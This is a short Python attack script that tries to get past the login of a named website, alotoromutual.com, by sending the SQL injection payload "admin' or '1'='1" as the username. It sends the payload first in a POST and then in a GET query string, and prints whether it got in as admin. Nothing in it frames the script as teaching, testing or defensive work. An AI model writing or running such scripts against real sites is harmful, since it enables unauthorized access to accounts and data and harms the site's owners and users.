#!/usr/bin/env python3
import requests

url = 'http://alotoromutual.com'
headers = {'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36'}

# login function
def login(username, password):
    # craft the POST request data
    data = {'username': username, 'password': password}
    # send the request to the server
    response = requests.post(url + '/login', headers=headers, data=data)
    # check if we got a successful login
    if "Welcome" in response.text:
        print("Successfully logged in.")
        return True
    else:
        print("Failed to log in.")
        return False

# main function
if __name__ == '__main__':
    # username and password for the attack
    username = "admin' or '1'='1"  # SQLi payload
    password = ""
    
    # try to login
    if not login(username, password):
        print("Could not log in as admin. Trying a different technique...")
        
        # crafting the url with sql injection
        url_with_injection = f"{url}/login?username={username}&password="
        response = requests.get(url_with_injection, headers=headers)
        
        if "Welcome" in response.text:
            print("Successfully logged in with SQL injection.")
        else:
            print("Failed to log in using SQL injection.")